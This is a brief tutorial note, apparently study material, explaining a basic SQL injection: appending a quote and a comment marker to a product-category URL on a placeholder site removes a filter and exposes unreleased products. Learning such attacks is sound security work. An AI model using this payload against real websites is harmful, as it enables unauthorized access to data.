--- ---

<h2>Retrieving Hidden Data</h2>

Target URL: https://insecure-website.com/products?category=Gifts
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Exploit URL: https://insecure-website.com/products?category=Gifts' --
```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

- -- is a comment indicator in SQL

In Result, all produces are displayed -> including unreleased products